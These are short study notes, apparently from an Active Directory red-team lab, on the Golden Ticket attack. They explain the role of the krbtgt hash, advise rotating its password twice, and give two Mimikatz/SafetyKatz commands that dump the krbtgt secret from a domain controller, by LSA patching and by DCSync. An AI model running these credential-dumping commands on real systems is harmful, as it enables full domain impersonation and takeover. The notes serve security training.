### Golden Ticket
- A golden ticket is signed and encrypted by the hash of krbtgt account for TGT ticket.
- The krbtgt user hash could be used to _impersonate any user with any privileges_ from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

#### Attack
__Run mimikatz on DC as DA to get krbtgt hash__
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

• To use the DCSync feature for getting AES keys for krbtgt account. Run with DA privileges (or a user that has replication rights on the domain object):
```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```




